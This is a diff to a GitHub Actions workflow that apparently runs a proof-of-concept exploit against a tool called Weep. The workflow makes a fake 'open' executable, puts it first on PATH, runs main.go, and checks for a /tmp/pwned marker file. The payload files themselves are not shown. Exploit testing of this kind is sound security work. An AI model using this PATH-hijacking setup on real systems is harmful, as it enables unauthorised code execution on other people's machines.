@@ -1,3 +1,9 @@
+name: Weep OpenLink Exploit Test
+
+on:
+  push:
+    branches: [ main ]
+
 jobs:
   exploit:
     runs-on: ubuntu-latest
@@ -10,15 +16,11 @@ jobs:
         with:
           go-version: 1.20
 
-      - name: Download dependencies
-        run: go mod download
-
       - name: Make fake open executable
         run: chmod +x fakebin/open
 
       - name: Prepend fakebin to PATH and run PoC
         run: |
           export PATH="${GITHUB_WORKSPACE}/fakebin:$PATH"
-          echo "[*] PATH is: $PATH"
           go run main.go
-          ls -l /tmp/pwned || echo "[-] /tmp/pwned not found"
+          ls -l /tmp/pwned || echo "/tmp/pwned not found"
